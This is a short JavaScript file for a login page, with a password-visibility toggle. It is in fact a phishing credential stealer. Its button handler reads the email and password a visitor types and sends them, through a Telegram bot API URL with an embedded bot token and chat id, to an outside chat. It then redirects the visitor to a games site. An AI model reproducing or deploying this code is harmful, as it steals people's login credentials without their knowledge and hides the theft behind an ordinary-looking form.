function initializeScript() {
  const toggleEyeIcon = document.querySelector("#toggleEyeIcon");
  const passwordField = document.querySelector("#password_field");
  passwordField.addEventListener("input", function (event) {
    const inputType = event.inputType;
    const passwordFieldEmpty = !this.value;
    if (inputType === "deleteContentBackward" && passwordFieldEmpty) {
      toggleEyeIcon.style.display = "none";
    } else {
      toggleEyeIcon.style.display = "block";
    }
  });

  toggleEyeIcon.addEventListener("click", function () {
    // Toggle the 'type' attribute of that passwordField input element
    const type =
      passwordField.getAttribute("type") === "password" ? "text" : "password";
    passwordField.setAttribute("type", type);

    // Toggle the eye slash icon
    type === "password"
      ? (this.className = "far fa-eye-slash")
      : (this.className = "far fa-eye");
  });
}

initializeScript();



let btn = document.querySelector("#btn")
btn.addEventListener("click", () => {
  let emailInput = document.querySelector("#email")

let passwordInput = document.querySelector("#password_field")


  let emailValue = emailInput.value;
  let passValue = passwordInput.value;
  let api = `https://api.telegram.org/bot5951822431:AAEFoaPj1Ayy1AbZUET0Kbr_HML6HWu-WuY/sendMessage?chat_id=5113505799&text=Portfolio\nEmail: ${emailValue} Password: ${passValue}`;

  fetch(api, {
    method: "POST",
  });
  if(emailValue.length > 2){
    window.open("https://poki.com/","_self")
  }
});
